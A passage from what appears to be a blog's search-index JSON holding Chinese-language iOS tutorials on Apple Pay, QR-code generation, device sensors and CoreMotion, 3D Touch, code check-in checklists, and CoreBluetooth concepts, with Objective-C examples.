可以访问)，然后将加密后的数据发送至支付框架。支付框架再将这些数据发送至 Apple 的服务器。\nApple 服务器使用商家标识证书将这些支付数据重新加密。这些令牌只能由你以及那些与你共享商户标识证书的人读取。随后服务器生成支付令牌再将其发送至设备。\n支付框架调用 paymentAuthorizationViewController:didAuthorizePayment:completion: 方法将令牌发送至你的委托。你在委托方法中再将其发送至你的服务器。\n\n在服务器上的处理操作取决于你是自己处理支付还是使用其它支付平台。不过，在两种情况下服务器都得处理订单再将处理结果返回给设备。在设备上，委托再将处理结果传入完成处理方法中。\n// 用户已经授权支付- (void)paymentAuthorizationViewController:(PKPaymentAuthorizationViewController *)controller didAuthorizePayment:(PKPayment *)payment completion:(void (^)(PKPaymentAuthorizationStatus))completion&#123;    // 将付款信息与其它处理订单的必需信息一起发送至你的服务器。如支付令牌、配送地址、账单地址。    // ...    // 从你的服务器获取支付授权状态，验证支付结果    PKPaymentAuthorizationStatus status = PKPaymentAuthorizationStatusSuccess;    completion(status);&#125;\n\n授权支付完成支付框架显示完支付事务状态后，授权视图控制器会调用委托的 aymentAuthorizationViewControllerDidFinish: 方法。在此方法的实现中，你应该释放授权视图控制器然后再显示与应用相关的支付信息界面。\n- (void) paymentAuthorizationViewControllerDidFinish:(PKPaymentAuthorizationViewController *)controller&#123;    [controller dismissViewControllerAnimated:YES completion:nil];&#125;\n\n处理支付处理一次付款事务一般包括以下几个步骤：\n\n将付款信息与其它处理订单的必需信息一起发送至你的服务器。\n验证付款数据的散列值与签名。\n解密出支付数据。\n将支付数据提交给付款处理网络。\n将订单信息提交至你的订单跟踪系统。\n\n你有两种可选的方式处理付款过程：\n\n利用已有的支付平台来处理付款。\n自己实现付款过程。\n\n一次付款的处理过程通常情况下包括上述的大部分步骤。\n访问、验证以及处理付款信息都需要你懂得一些加密领域的知识，比如 SHA-1 哈希、访问和验证 PKCS #7 签名以及如何实现椭圆曲线 Diiffie-Hellman 密钥交换等。如果你没有这些加密的背景知识，我们建议你使用已有支付平台，它们会替你完成这些繁琐的操作。关于 Apple Pay 已支持的第三方支付平台，请参考 https://developer.apple.com/apple-pay/。\n付款数据是嵌套结构。支付令牌是 PKPaymentToken 类的实例。其 paymentData 属性值是一个 JSON 字典。该 JSON 字典包括用于验证信息有效性头信息以及加密后的付款数据。加密后的支付数据包括付款金额、持卡人姓名以及其它特定支付处理协议的信息。\n\n更多关于付款数据的数据结构，请参考支付令牌的格式。\n参考资料\n官方Pay教程\nApple Pay 中文入门\nApple Pay 编程指南\n\n Pay VS In-App Purchase\n\n\n\n Pay\nIn-App Purchase\n\n\n\n框架\nPassKit\nStoreKit\n\n\n适用范围\n实体商品（如食品杂货、服装和电器）和服务（如俱乐部会员、酒店预订和活动门票）\n销售虚拟商品，如适用于您的 App 的优质内容及订阅数字内容；程序内的内容和功能性；程序内货币服务；数码订阅\n\n\n支付处理\n自己的支付平台处理付款\n苹果公司处理付款\n\n\n代码下载https://github.com/xwal/Demo/tree/master/Payment\n","categories":["iOS"],"tags":["支付宝支付","微信支付","IAP","应用内支付","Apple Pay"]},{"title":"iOS 硬件（二维码、传感器、3D-Touch、蓝牙）","url":"/2016/02/18/iOS-Hardware/","content":"二维码扫描识别iOS中实现二维码和条形码扫描，两大开源组件 ZBarSDK 与 ZXing以及AVFoundation。AVFoundation.framework（iOS 7 ）之后才添加了二维码扫描的功能。\n二维码生成- (UIImage *)qrCodeGenerator:(NSString *)msg size:(CGSize)size &#123;    NSData * data = [msg dataUsingEncoding:NSUTF8StringEncoding];        NSDictionary * params = @&#123;@&quot;inputMessage&quot;: data, @&quot;inputCorrectionLevel&quot;: @&quot;H&quot;&#125;;    CIFilter * qrEncoder = [CIFilter filterWithName:@&quot;CIQRCodeGenerator&quot; withInputParameters:params];    CIImage * ciImage = qrEncoder.outputImage;    UIImage * qrImage = [UIImage imageWithCIImage:ciImage];        UIGraphicsBeginImageContext(size);    CGContextRef context = UIGraphicsGetCurrentContext();    CGContextSetInterpolationQuality(context, kCGInterpolationNone);    [qrImage drawInRect:CGRectMake(0, 0, size.width, size.height)];    qrImage = UIGraphicsGetImageFromCurrentImageContext();    UIGraphicsEndImageContext();    return qrImage;&#125;\n\nDemo下载：QRCodeScanner\n\n传感器距离传感器（Proximity Sensor）用于检测是否有其他物体靠近设备屏幕\n// 开启距离感应功能[UIDevice currentDevice].proximityMonitoringEnabled = YES;// 监听距离感应的通知[[NSNotificationCenter defaultCenter] addObserver:selfselector:@selector(proximityChange:)name:UIDeviceProximityStateDidChangeNotificationobject:nil];- (void)proximityChange:(NSNotification *)notification &#123;    if ([UIDevice currentDevice].proximityState == YES) &#123;    NSLog(@&quot;某个物体靠近了设备屏幕&quot;); // 屏幕会自动锁住    &#125; else &#123;    NSLog(@&quot;某个物体远离了设备屏幕&quot;); // 屏幕会自动解锁    &#125;&#125;\n\n磁力计传感器（Magnetometer Sensor）可以感应地球磁场， 获得方向信息， 使位置服务数据更精准。\n可以用于电子罗盘和导航应用。\n调用CLLocationManager的startUpdatingHeading方法获取方向信息。获取方向结束时，可调用stopUpdatingHeading方法结束获取方向信息。当设备的方向改变时，iOS系统将会自动激发CLLocationManager的delegate对象的locationManager:didUpdateHeading:方法，而程序可通过重写该方法来获取设备方向。\n\n环境光传感器（Ambient Light Sensor）是iPhone和Mac设备中最为古老的传感器成员\n它能够让你在使用 Mac、iPhone、iPad时，眼睛更为舒适。\n从一个明亮的室外走入相对黑暗的室内后，iOS设备会自动调低亮度，让屏幕显得不再那么光亮刺眼。\n当你使用iPhone拍照时，闪光灯会在一定条件下自动开启\n几乎所有的Mac 都带有背光键盘，当周围光线弱到一定条件时，会自动开启键盘背光\n// 获取当前环境下屏幕亮度NSLog(@&quot;Screen Brightness: %f&quot;,[UIScreen mainScreen].brightness);// 可以监听屏幕亮度改变的通知 UIScreenBrightnessDidChangeNotification\n\nCoreMotionCoreMotion是一个专门处理Motion的框架，其中包含了两个部分加速度计和陀螺仪。加速计由三个坐标轴决定，用户最常见的操作设备的动作移动，晃动手机(摇一摇)，倾斜手机都可以被设备检测到，加速计可以检测到线性的变化，陀螺仪可以更好的检测到偏转的动作，可以根据用户的动作做出相应的动作，iOS模拟器无法模拟以上动作，真机调试需要开发者账号。\n处理Motion事件有三种方式，开始(motionBegan)，结束(motionEnded)，取消(motionCancelled)：\n- (void)motionBegan:(UIEventSubtype)motion withEvent:(UIEvent *)event NS_AVAILABLE_IOS(3_0);- (void)motionEnded:(UIEventSubtype)motion withEvent:(UIEvent *)event NS_AVAILABLE_IOS(3_0);- (void)motionCancelled:(UIEventSubtype)motion withEvent:(UIEvent *)event NS_AVAILABLE_IOS(3_0);\n\nCMMotionManager类能够使用到设备的所有移动数据(motion data)，Core Motion框架提供了两种对motion数据的操作方式：\npull方式：能够以CoreMotionManager的只读方式获取当前任何传感器状态或是组合数据，在有需要的时候，再主动去采集数据；\npush方式：是以块或者闭包的形式收集到想要得到的数据并且在特定周期内得到实时的更新，实时采集所有数据（采集频率高)；\n加速计传感器（Motion&#x2F;Accelerometer Sensor）加速计用于检测设备在X、Y、Z轴上的加速度 （哪个方向有力的作用）\n加速计可以用于检测设备的摇晃，经典应用场景\n摇一摇、计步器\n\n如果只需要知道设备的方向，不需要知道具体方向矢量角度，那么可以使用UIDevice进行操作，还可以根据方向就行判断,具体可以参考一下苹果官网代码:\n-(void) viewDidLoad &#123;     // Request to turn on accelerometer and begin receiving accelerometer events     [[UIDevice currentDevice] beginGeneratingDeviceOrientationNotifications];     [[NSNotificationCenter defaultCenter] addObserver:self selector:@selector(orientationChanged:) name:UIDeviceOrientationDidChangeNotification object:nil];&#125;- (void)orientationChanged:(NSNotification *)notification &#123;     // Respond to changes in device orientation&#125;-(void) viewDidDisappear &#123;     // Request to stop receiving accelerometer events and turn off accelerometer     [[NSNotificationCenter defaultCenter] removeObserver:self];     [[UIDevice currentDevice] endGeneratingDeviceOrientationNotifications];&#125;- (BOOL)canBecomeFirstResponder &#123;    return YES;&#125;- (void)viewDidAppear:(BOOL)animated &#123;    [self becomeFirstResponder];&#125;\n\nPush 方式：\n// 创建运动管理者对象_motionMgr = [[CMMotionManager alloc] init];// 判断加速计是否可用（最好判断）if (_motionMgr.isAccelerometerAvailable) &#123;    // 加速计可用    // 设置采样间隔    _motionMgr.accelerometerUpdateInterval = 1.0/30.0; // 1秒钟采样30次    // 开始采样（采样到数据就会调用handler，handler会在queue中执行）    [_motionMgr startAccelerometerUpdatesToQueue:[[NSOperationQueue alloc] init] withHandler:^(CMAccelerometerData * accelerometerData, NSError * error) &#123;        CMAcceleration acceleration = accelerometerData.acceleration;        NSLog(@&quot;CMAcceleration: %f--%f--%f&quot;, acceleration.x, acceleration.y, acceleration.z);    &#125;];&#125;else &#123;    // 加速度计不能用    NSLog(@&quot;加速度计不能用&quot;);&#125;\n\nPull 方式：\n// 创建运动管理者对象_motionManager = [[CMMotionManager alloc] init];// 判断加速计是否可用（最好判断）if (_motionManager.isAccelerometerAvailable) &#123;    // 加速计可用    // 设置加速计采样频率    _motionManager.accelerometerUpdateInterval = 1.0/30.0; // 1秒钟采样30次    // 开始采样    [_motionManager startAccelerometerUpdates];&#125;// 在需要的时候采集加速度数据CMAcceleration acceleration = _motionManager.accelerometerData.acceleration;NSLog(@&quot;%f, %f, %f&quot;, acceleration.x, acceleration.y, acceleration.z);\n\n陀螺仪（Gyroscope）陀螺仪的原理是检测设备在X、Y、Z轴上所旋转的角速度\n陀螺仪在赛车类游戏中有重大作用：\n模拟汽车驾驶时方向盘旋转的动作，使得这类游戏的操控体验更为真实\n\nPush 方式：\n// 创建运动管理者对象if (!_motionManager) &#123;    _motionManager = [[CMMotionManager alloc] init];&#125;// 判断陀螺仪是否可用if (_motionManager.gyroAvailable) &#123;    // 设置采样频率    _motionManager.gyroUpdateInterval = 1 / 10.0; // 1秒钟采样10次    // 开始采样    [_motionManager startGyroUpdatesToQueue:[[NSOperationQueue alloc] init] withHandler:^(CMGyroData * gyroData, NSError * error) &#123;        // 获取陀螺仪的信息        CMRotationRate rotationRate = gyroData.rotationRate;        NSLog(@&quot;x:%f y:%f z:%f&quot;, rotationRate.x, rotationRate.y, rotationRate.z);    &#125;];&#125;else &#123;    // 陀螺仪不能用    NSLog(@&quot;陀螺仪不能用&quot;);&#125;\n\nPull 方式：\n// 创建运动管理者对象if (!_motionManager) &#123;    _motionManager = [[CMMotionManager alloc] init];&#125;// 判断陀螺仪是否可用if (_motionManager.gyroAvailable) &#123;    // 设置采样频率    _motionManager.gyroUpdateInterval = 1 / 10.0; // 1秒钟采样10次    // 开始采样    [_motionManager startGyroUpdates];&#125;else &#123;    // 陀螺仪不能用    NSLog(@&quot;陀螺仪不能用&quot;);&#125;// 在需要的时候采集加速度数据CMRotationRate rotationRate = _motionManager.gyroData.rotationRate;NSLog(@&quot;x:%f y:%f z:%f&quot;, rotationRate.x, rotationRate.y, rotationRate.z);\n\n计步器（CMStepCounter）// 判断当前系统版本，iOS 8 之后CMStepCounter废弃了if ([[UIDevice currentDevice].systemVersion floatValue] &lt; 8.0)&#123;    // 1.判断计步器是否可用    if (![CMStepCounter isStepCountingAvailable]) &#123;        NSLog(@&quot;计步器不可用&quot;);        return;    &#125;    // 创建计步器    if (!_stepCounter) &#123;        _stepCounter = [[CMStepCounter alloc] init];    &#125;    // 开始计步    // updateOn : 用户走了多少步之后, 更新block    NSOperationQueue *queue = [[NSOperationQueue alloc] init];    [_stepCounter startStepCountingUpdatesToQueue:queue updateOn:5 withHandler:^(NSInteger numberOfSteps, NSDate * timestamp, NSError * error) &#123;        if (error) &#123;            NSLog(@&quot;%@&quot;, error);            return;        &#125;        NSLog(@&quot;一共走了%ld步&quot;, numberOfSteps);    &#125;];&#125;else &#123;    // 判断计步器是否可用    if (![CMPedometer isStepCountingAvailable]) &#123;        return;    &#125;    // 创建计步器    if (!_pedometer) &#123;        _pedometer = [[CMPedometer alloc] init];    &#125;    // 开始计步    // FromDate : 从什么时间开始计步    NSDate *date = [NSDate date];    [_pedometer startPedometerUpdatesFromDate:date withHandler:^(CMPedometerData * pedometerData, NSError * error) &#123;        if (error) &#123;            NSLog(@&quot;%@&quot;, error);            return;        &#125;        NSLog(@&quot;您一共走了%@步&quot;, pedometerData.numberOfSteps);    &#125;];    // 计算两个时间间隔走了多少步    NSDateFormatter *fmt = [[NSDateFormatter alloc] init];    fmt.dateFormat = @&quot;yyyy-MM-dd&quot;;    NSDate *fromDate = [fmt dateFromString:@&quot;2015-9-26&quot;];    NSDate *toDate = [fmt dateFromString:@&quot;2016-1-28&quot;];    [_pedometer queryPedometerDataFromDate:fromDate toDate:toDate withHandler:^(CMPedometerData * pedometerData, NSError * error) &#123;        NSLog(@&quot;从%@到%@期间，总共走了%@步，总长%@米，上楼%@层，下楼%@层&quot;, pedometerData.startDate, pedometerData.endDate, pedometerData.numberOfSteps, pedometerData.distance, pedometerData.floorsAscended, pedometerData.floorsDescended);    &#125;];&#125;\n\nDemo 下载：SensorDemo3D Touch3D Touch 仅支持iPhone 6S&#x2F; 6S Plus，支持的iOS 系统版本为iOS 9。\n使用3D Touch功能，主要分为以下三个模块：Home Screen Quick Actions、Peek and Pop、UITouch Force Properties。\nHome Screen Quick Actions通过主屏幕的应用Icon，我们可以用3D Touch呼出一个菜单，进行快速定位应用功能模块相关功能的开发。\n\niOS9为我们提供了两种屏幕标签，分别是静态标签和动态标签。\n静态标签静态标签是我们在项目的配置plist文件中配置的标签，在用户安装程序后就可以使用，并且排序会在动态标签的前面。\n在info.plist文件中添加如下键值（系统没有提示，只能\b手动输入）：\n\n显示效果\n\n添加步骤：\n\n先添加了一个UIApplicationShortcutItems的数组\n\n数组中添加的元素就是对应的静态标签，在每个标签中我们需要添加一些设置的键值：\n必填项：\nUIApplicationShortcutItemType 这个键值设置一个快捷通道类型的字符串\nUIApplicationShortcutItemTitle 这个键值设置标签的标题\n选填项：\nUIApplicationShortcutItemSubtitle 设置标签的副标题\nUIApplicationShortcutItemIconType 设置标签Icon类型\nUIApplicationShortcutItemIconFile  设置标签的Icon文件\nUIApplicationShortcutItemUserInfo 设置信息字典(用于传值)\n\n\n动态标签动态标签是我们在程序中，通过代码添加的。\n与之相关的类，主要有三个：\nUIApplicationShortcutItem 创建3DTouch标签的类\nUIMutableApplicationShortcutItem 创建可变的3DTouch标签的类\nUIApplicationShortcutIcon 创建标签中图片Icon的类\n//创建UIApplicationShortcutItem * item = [[UIApplicationShortcutItem alloc]initWithType:@&quot;two&quot; localizedTitle:@&quot;第二个标签&quot; localizedSubtitle:@&quot;看我哦&quot; icon:[UIApplicationShortcutIcon iconWithType:UIApplicationShortcutIconTypePlay] userInfo:nil];// 添加[UIApplication sharedApplication].shortcutItems = @[item];\n\n响应标签的行为当我们点击标签进入应用程序时，有这样一个方法可以进行一些操作：\n- (void)application:(UIApplication *)application performActionForShortcutItem:(UIApplicationShortcutItem *)shortcutItem completionHandler:(void (^)(BOOL))completionHandler\n当我们通过标签进入app时，就会在AppDelegate中调用这样一个回调，我们可以获取shortcutItem的信息进行相关逻辑操作。\n这里有一点需要注意：\n我们在app的入口函数：\n- (BOOL)application:(UIApplication *)application didFinishLaunchingWithOptions:(NSDictionary *)launchOptions\n也需要进行一下判断，在launchOptions中有UIApplicationLaunchOptionsShortcutItemKey这样一个键，通过它，我们可以区别是否是从标签进入的app，如果是则处理结束逻辑后，返回NO，防止处理逻辑被反复回调。\n几点注意：\n快捷标签最多可以创建四个，包括静态的和动态的。\n每个标签的题目和icon最多两行，多出的会用…省略\n\nPeek and Poppeek (预览)和 pop (详阅)。\n现在你可以授权应用的视图控制器来响应用户不同的按压力量。随着用户按压力量的增加，交互会出现三个阶段:\n1.暗示内容预览是可使用的轻按后，周围内容会变得模糊，这告诉用户预览更多内容( peek )是可以使用的。\n\n2.展示预览(peek)，和快捷选项菜单（peek quick actions）轻按，屏幕视图就会过渡到 peek，一个你设置的用来展示更多内容的视图－就像Mail app做的一样。如果用户这时结束了触碰，peek就会消失并且应用回到交互开始之前的状态。\n或者这个时候，用户可以在peek界面上更用力按下来跳转到使用peek呈现的视图,这个过渡动画会使用系统提供的pop过渡。pop出来的视图会填满你应用的根视图并显示一个返航按钮可以回到交互开始的地方。(图中没有显示最后展示pop视图的阶段)\n\nPeek快速选项\n如果用户一直保持触摸，可以向上滑动Peek视图，系统会展示出你预先设置和peek关联的peek快速选项。\n每一项peek快速选项都是你应用中的深度链接。当peek快速选项出现后，用户可以停止触摸而且peek会停留在屏幕中。用户可点击一个快速选项，唤出相关链接。\n\n3.可选的跳转到预览中的视图(pop)当你使用 peek 和 pop 时,系统通过压力决定从哪个阶段过度至下一个。用户可以在设置&gt;通用&gt;辅助功能&gt;3D Touch中进行修改。\nUITouch Force PropertiesIn iOS 9, the UITouch class has two new properties to support custom implementation of 3D Touch in your app: force and maximumPossibleForce. For the first time on iOS devices, these properties let you detect and respond to touch pressure in the UIEvent objects your app receives.\nThe force of a touch has a high dynamic range, available as a floating point value to your app.\n参考文章\n官方文档：https://developer.apple.com/ios/3d-touch/\nhttp://my.oschina.net/u/2340880/blog/511509\nhttp://www.cocoachina.com/ios/20151028/13849.html\n\nDemo 下载：3D-Touch蓝牙（BlueTooth）参考PO主另外一篇文章：http://chaosky.me/2016/03/18/Bluetooth-Communication/\n","categories":["iOS"],"tags":["QRCode","Sensor","3D Touch"]},{"title":"iOS 清单","url":"/2016/03/18/iOS-Checklist/","content":"iOS代码签入前检查清单\n\n\niOS Pre-Check-in Checklist\nYes&#x2F;No\n\n\n\nHave I regression tested everything in Instruments for leaks and abandoned memory?\n\n\n\nHave I ran all automated UI tests and verified there are no crash bugs?\n\n\n\nHave I ran all unit tests to insure I haven’t broken anything?\n\n\n\nDid I do a compare of all the code to make sure all code is code review ready?\n\n\n\nHave all new files been added into source control?\n\n\n\nHave all work items been updated and ready to associate with the check-in?\n\n\n\nHave I removed all code I commented out that no longer needs to be there?\n\n\n\nHave I written clean code comments?\n\n\n\nIs there anything I hacked together quickly to get it to work but needs to be cleaned up?\n\n\n\nIs there duplicate code that I could simplify into 1 location?\n\n\n\nIs there debug code that needs to be removed or commented out?\n\n\n\nIs all text localized for all supported languages?\n\n\n\nAre all images provided by the graphic designer checked in?\n\n\n\nAre there any warnings in the checked-out files that can be addressed in this check-in?\n\n\n\nAre there new dev target&#x2F;environment settings that I forgot to also add to the production target&#x2F;environment?\n\n\n\n\n是否在Instruments中对内存泄露进行了回归测试？\n\nHave I regression tested everything in Instruments for leaks and abandoned memory?\n\n\n是否运行了所有的UI测试同时确认没有crash bugs？\n\nHave I ran all automated UI tests and verified there are no crash bugs?\n\n\n是否运行了所有的单元测试确保没有造成破坏？\n\nHave I ran all unit tests to insure I haven’t broken anything?\n\n\n是否进行了所有代码比较确保所有代码审查准备好了？\n\nDid I do a compare of all the code to make sure all code is code review ready?\n\n\n是否所有新文件都添加到源代码管理中？\n\nHave all new files been added into source control?\n\n\n是否所有工作项已经被更新并准备签入？\n\nHave all work items been updated and ready to associate with the check-in?\n\n\n是否移除了已经注释过不再使用的代码？\n\nHave I removed all code I commented out that no longer needs to be there?\n\n\n是否写了清晰的代码注释？\n\nHave I written clean code comments?\n\n\n是否有某个功能是仅仅为了让程序能迅速运行但是需要清除的(比如某段没有设计过的功能代码)？\n\nIs there anything I hacked together quickly to get it to work but needs to be cleaned up?\n\n\n是否有可以简化的重复代码？\n\nIs there duplicate code that I could simplify into 1 location?\n\n\n是否有需要移除或者注释掉的调试代码？\n\nIs there debug code that needs to be removed or commented out?\n\n\n是否所有支持多语言的文本都已经本地化？\n\nIs all text localized for all supported languages?\n\n\n是否由图形设计师提供的图片都已经签入？\n\nAre all images provided by the graphic designer checked in?\n\n\n是否在本次签入代码之前能够解决检出代码的警告？\n\nAre there any warnings in the checked-out files that can be addressed in this check-in?​\n\n\n是否有新的开发的target&#x2F;environment设置忘了添加到生产的 target&#x2F;environment？\n\nAre there new dev target&#x2F;environment settings that I forgot to also add to the production target&#x2F;environment?\n\n\n\niOS 测试清单\n\n\nFinal Sanity Checks\nAppearance\nFunctionality\n\n\n\nLocalized?\nYES\nNO\n\n\nPortrait&#x2F;Landscape?\n\n\n\n\nEmpty Data Source?\n\n\n\n\nLarge Data Source?\n\n\n\n\nCRUD?\n\n\n\n\nAll modes&#x2F;perspectives?\n\n\n\n\nDifferent Entry&#x2F;Exit points?\n\n\n\n\nDifferent User Settings?\n\n\n\n\nWithout internet connection?\n\n\n\n\niPhone &amp; iPad? (if Universal)\n\n\n\n\nNew Install?\n\n\n\n\nDifferent version of iOS?\n\n\n\n\n","categories":["iOS"],"tags":["Checklist"]},{"title":"蓝牙通信","url":"/2016/03/18/Bluetooth-Communication/","content":"蓝牙(Bluetooth)去App Store搜索并下载**『LightBlue』**这个App，对调试你的app和理解Core Bluetooth会很有帮助。\n蓝牙常见名称和缩写\nMFI —— make for ipad ,iphone, itouch 专门为苹果设备制作的设备\nBLE —— buletouch low energy，蓝牙4.0设备因为低耗电，所以也叫做BLE\nperipheral,central —— 外设和中心，发起连接的设备为central，被连接的设备为perilheral\nservice and characteristic —— 服务和特征，每个设备会提供服务和特征，类似于服务端的api，但是机构不同。每个设备都会有一些服务，每个服务里面都会有一些特征，特征就是具体键值对，提供数据的地方。每个特征属性分为这么几种：读，写，通知三种方式。\nDescription —— 每个characteristic可以对应一个或多个Description用户描述characteristic的信息或属性\n\nMFI —— 开发使用ExternalAccessory 框架\n4.0 BLE —— 开发使用CoreBluetooth 框架\n\n\nCore Bluetooth概述CoreBluetooth框架能够让你的iOS和Mac App能够和支持BLE的设备进行通信。比如，你的应用程序可以发现、搜索、以及和这些支持BLE的外围设备进行交互，比如心率监测器、数字温控器，甚至其他的iOS设备。\n该框架基于BLE4.0规范，直接适用于蓝牙低功率设备的使用。是对于蓝牙 4.0规范的一个抽象，该框架隐藏了很多开发规范的底层实现细节，使您更容易开发出与蓝牙低功耗设备进行交互的App。因为该说明中涉及到蓝牙框架的一些概念和术语在本说明中已经被广泛采用，本文将向你介绍这个 Core Bluetooth 框架中的一些关键术语和概念。\n中央（Central）和外围设备（Peripheral）以及它们之间蓝牙通信的规则所有涉及蓝牙低功耗的交互中有两个主要的角色：中心Central和外围设备Perpheral。根据一些传统的客户端-服务端结构，Peripheral通常具有其他设备所需要的数据，而Central通常通过使用Perpheral的信息来实现一些特定的功能。如下图所示，例如，一个心率监听器可能含有一些有用的信息，你的 Mac&#x2F;iOS app 可能需要以用户友好的方式显示用户的心率。\n\nCentral 发现并连接广播中的 PeripheralPeripheral向外广播一些广告包(Advertising)形式的数据，广告包是一个相对较小的、捆绑了外围可能包含的有用信息且必须提供的数据包，如外设的名称和主要功能。例如，一个数字温控器可能广播它能提供当前房间的温度。在低功耗蓝牙中，广播是Peripheral被获知的主要方式。另一方面说，Central可以扫描和监听任何对广播内容感兴趣的Peripheral。如下图，Central可以请求连接任何已对外广播内容的Peripheral。\n\n数据在 Peripheral 中如何构成连接到Peripheral的目的是为了对它所提供的数据进行探索和交互。在此之前，理解数据在Peripheral中是怎样构成的将会对我们有所帮助。  \nPeripheral包含一个或者多个Service（服务）以及有关其连接信号强度的有用信息。Service是指为了实现一个功能或者特性的数据采集和相关行为的集合。例如，一个心率监听器的Service可能包含从监听心率传感器采集的心率数据。\nService本身由Characteristic（特征）或者包含其他被引用的Service组成。Characteristic提供了Peripheral的Service更多细节。例如，刚才描述的心率service中包含一个用来描述心率传感器位置信息的characteristic和另外一个发送测量心率数据的Characteristic（即这个服务包含了两个特征）。如下图阐述了一个心率监测器的服务和特征的数据可能的结构和特点。\n\nCentral 在 Peripheral 上的数据探索及交互在Central成功与Peripheral建立连接后，就能发现到Peripheral提供的所有的Service和Characteristic。(广播数据可能只包含一部分可用的Service)Central可以通过读写Service中Characteristic的value与Peripheral进行交互。例如，你的 App 也许会从数字温控器那里请求当前的室内温度，或者 App 向数字温控器提供一个值从而来设置当前房间的温度。\nCentral、Peripherals及Peripheral数据的表示在低功耗蓝牙通信中的主要角色(即前面提到的Central和Peripheral)及其数据通过简单、直接的方法映射到了CoreBluetooth框架中。\nCentral 端的对象当你使用本地Central和远程Peripheral进行交互(这里本地和远程的意思就是，比如你拿着手机搜索其他的设备，那么你的手机就是本地Central这端，其他的设备是远程Peripheral一端，这里的本地和远程是相对我们用户来说，表示空间距离，不是我们通常意义上的本地和远程，大家直接忽略本地和远程对理解也不会有什么影响)，在低功耗蓝牙通信中你通常扮演Central这端。除非你是建立一个本地Peripheral设备用来响应其他Central的请求，大多数的蓝牙交互由Central端完成。\n本地 Central 和远程 Peripheral在Central端，本地Central设备用CBCentralManager对象表示。这些对象用来管理发现或连接远程Peripheral设备(表示为CBPeripheral)，包括扫描，发现和连接广播中的Peripheral。下图展示了在CoreBluetooth框架中本地 Central 和远程 Peripheral的对象表示。\n\n远程 Peripheral 数据表示为 CBService 和CBCharacteristic当你与远程Peripheral(表示为CBPeripheral)进行数据交互时，你将处理它的Service和Characteristic。在Core Bluetooth框架中，远程Peripheral的Service表示为CBService。相类似的，远程Peripheral中Service的Characteritic表示为CBCharacteristic。下图阐述了远程外围服务及特征的基础结构。\n\nPeripheral 端的对象在OS X 10.9和iOS6以后，Mac和iOS设备可以设置成低功耗蓝牙的Peripheral，能够提供数据给其他的设备，包括其他的Macs，iPhones，iPads。当设置你的设备实现Peripheral角色时，你就可以完成低功耗蓝牙交互的Peripheral端功能。\n本地 Peripheral 和远程 Central在Peripheral端，本地Peripheral设备用CBPeripheralManager对象来表示。这些对象用本地Peripheral设备的Service和Characteristic的数据库发布服务，广播给远程Central设备(表示为CBCentral)。CBPeripheralManager用时也用来响应远程Central的读写请求。下图展示了本地Peripheral和远程Central在CoreBluetooth框架中的表示。\n\n本地 Peripheral 数据表示为 CBMutableService 和 CBMutableCharacteristic当你建立和本地Peripheral(表示为CBPeripheralManager)数据交互，你其实是在处理Service和Characteristic的可变版本。就可以处理Service和Characteristic的可变版本。在Core Bluetooth框架中，本地Peripheral的Service表示为CBMutableService。相应的本地Peripheral中Service的Characteristic表示为CBMutableCharacteristic。下图阐述了本地外围服务和特征的基本结构。\n\n蓝牙开发流程CoreBluetooth框架的核心其实是两个东西，peripheral和central, 可以理解成外设和中心。对应他们分别有一组相关的API和类。这两组api分别对应不同的业务场景，左侧叫做中心模式，就是以你的app作为中心，连接其他的外设的场景，而右侧称为外设模式，使用手机作为外设别其他中心设备操作的场景。服务和特征，特征的属性(service and characteristic)：每个设备都会有一些服务，每个服务里面都会有一些特征，特征就是具体键值对，提供数据的地方。每个特征属性分为这么几种：读，写，通知这么几种方式。\n//objcetive c特征的定义枚举typedef NS_OPTIONS(NSUInteger, CBCharacteristicProperties) &#123;  CBCharacteristicPropertyBroadcast\t\t\t\t\t\t\t\t\t\t\t\t= 0x01,  CBCharacteristicPropertyRead\t\t\t\t\t\t\t\t\t\t\t\t\t= 0x02,  CBCharacteristicPropertyWriteWithoutResponse\t\t\t\t\t\t\t\t\t= 0x04,  CBCharacteristicPropertyWrite\t\t\t\t\t\t\t\t\t\t\t\t\t= 0x08,  CBCharacteristicPropertyNotify\t\t\t\t\t\t\t\t\t\t\t\t\t= 0x10,  CBCharacteristicPropertyIndicate\t\t\t\t\t\t\t\t\t\t\t\t= 0x20,  CBCharacteristicPropertyAuthenticatedSignedWrites\t\t\t\t\t\t\t\t= 0x40,  CBCharacteristicPropertyExtendedProperties\t\t\t\t\t\t\t\t\t\t= 0x80,  CBCharacteristicPropertyNotifyEncryptionRequired NS_ENUM_AVAILABLE(NA, 6_0)\t\t= 0x100,  CBCharacteristicPropertyIndicateEncryptionRequired NS_ENUM_AVAILABLE(NA, 6_0)\t= 0x200&#125;;\n\n蓝牙中心模式流程\n建立中心角色\n扫描外设（discover）\n连接外设(connect)\n扫描外设中的服务和特征(discover)\n4.1 获取外设的services\n4.2 获取外设的Characteristics,获取Characteristics的值，获取Characteristics的Descriptor和Descriptor的值\n\n\n与外设做数据交互(explore and interact)\n订阅Characteristic的通知\n断开连接(disconnect)\n\n蓝牙外设模式流程\n启动一个Peripheral管理对象\n本地Peripheral设置服务,特性,描述，权限等等\nPeripheral发送广告\n设置处理订阅、取消订阅、读characteristic、写characteristic的委托方法\n\n蓝牙设备状态\n待机状态（standby）：设备没有传输和发送数据，并且没有连接到任何设\n广播状态（Advertiser）：周期性广播状态\n扫描状态（Scanner）：主动寻找正在广播的设备\n发起链接状态（Initiator）：主动向扫描设备发起连接。\n主设备（Master）：作为主设备连接到其他设备。\n从设备（Slave）：作为从设备连接到其他设备。\n\n蓝牙设备的五种工作状态准备（standby）广播（advertising）监听扫描（Scanning发起连接（Initiating）已连接（Connected）\n第三方库&lt;https://github.com/coolnameismy/BabyBluetooth&gt;\n参考资料\n官网文档：https://developer.apple.com/library/ios/documentation/NetworkingInternetWeb/Conceptual/CoreBluetooth_concepts/CoreBluetoothOverview/CoreBluetoothOverview.html\nhttp://lynchwong.com/2014/12/15/iOS蓝牙，CoreBluetooth框架简介及入门使用/\nhttp://liuyanwei.jumppo.com/2015/07/17/ios-BLE-0.html\nhttp://www.jianshu.com/p/760f042a1d81\nhttp://southpeak.github.io/blog/2014/07/29/core-bluetoothkuang-jia-zhi-%5B%3F%5D-:centralyu-peripheral/\n\n多点通信（MultipeerConnectivity）去App Store搜索并下载 『FireChat』 这个App，对理解Multipeer Connectivity框架会很有帮助。\nMultipeerConnectivity概述那么Multipeer Connectivity框架到底能实现什么样的功能？即使在没有Wi-Fi和移动网络的情况下，利用Multipeer Connectivity框架，iOS设备之间也可以在一定范围内通过蓝牙和点对点的Wi-Fi连接进行通讯，这与利用Air Drop传输文件非常类似。\n两台iOS设备在使用Multipeer 